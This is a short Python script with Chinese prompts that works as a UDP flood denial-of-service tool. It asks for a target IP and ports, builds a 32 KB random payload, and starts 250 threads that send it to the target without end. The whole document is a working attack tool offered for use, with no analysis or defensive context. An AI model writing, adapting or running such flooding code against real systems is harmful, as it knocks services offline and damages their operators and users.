#!/usr/bin/python3
import os
import sys
import time
import socket
import random
import _thread
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip_address = input('IP：')
port = []
while True:
    tmp = input('攻击端口(留空结束):')
    if tmp == None or tmp == '':
        break
    else:
        tmp = int(tmp)
        port.append(tmp)
string = random._urandom(32768)
wait = input('继续攻击吗?')
print('准备中')
send = 0
ip_address = str(ip_address)
def attack (num,ip,_string):
    print('线程%s启动'%num)
    while True:
        for _port in port: 
            sock.sendto(_string, (ip,_port))
for lines in range(1,251):
    try:
        _thread.start_new_thread(attack,(lines,ip_address,string))
    except:
        print('%s启动失败'%lines)

while True:
    pass
